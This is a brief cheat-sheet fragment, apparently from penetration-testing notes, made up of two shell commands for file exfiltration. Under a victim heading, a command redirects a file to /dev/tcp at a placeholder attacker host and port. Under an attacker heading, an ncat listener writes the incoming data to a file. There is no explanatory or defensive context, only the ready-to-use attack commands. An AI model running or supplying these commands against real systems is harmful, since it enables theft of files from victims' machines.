

### Vic
```shell
cat <file> > /dev/tcp/<attacker>/<attacker_port>
```

### Attak
```shell
ncat -nlvp <attacker_port> > <file>
```